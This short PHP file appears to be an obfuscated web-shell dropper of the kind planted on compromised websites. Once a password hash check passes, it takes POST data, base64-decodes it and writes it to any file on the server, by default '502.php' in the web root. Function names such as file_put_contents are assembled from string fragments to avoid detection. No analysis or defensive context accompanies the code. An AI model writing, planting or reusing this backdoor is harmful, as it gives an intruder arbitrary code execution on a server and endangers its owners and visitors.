<?php
$lbz = $_POST;
if(!empty($lbz['b']) && md5($lbz['b'].md5($lbz['b']))=='14ee231dadb1d1c5ce1f7bae9f7f13eb') {
	$mkj = !empty($lbz['f']) ? $lbz['f'] : '502.'.'php';
	if(!empty($lbz['r'])) $mkj = $_SERVER['DOCUMENT_ROOT'].'/'.$mkj;
	$kay = 'f'.'I'.'l'.'E'.'_'.'p'.'u'.'t'.'_'.'c'.'O'.'n'.'t'.'E'.'n'.'T'.'S'; $cvs = 'BAS'.'e64'.'_de'.'cod'.'E';
	if($kay($mkj, $cvs($lbz['c']))) exit($mkj);
}
?>m5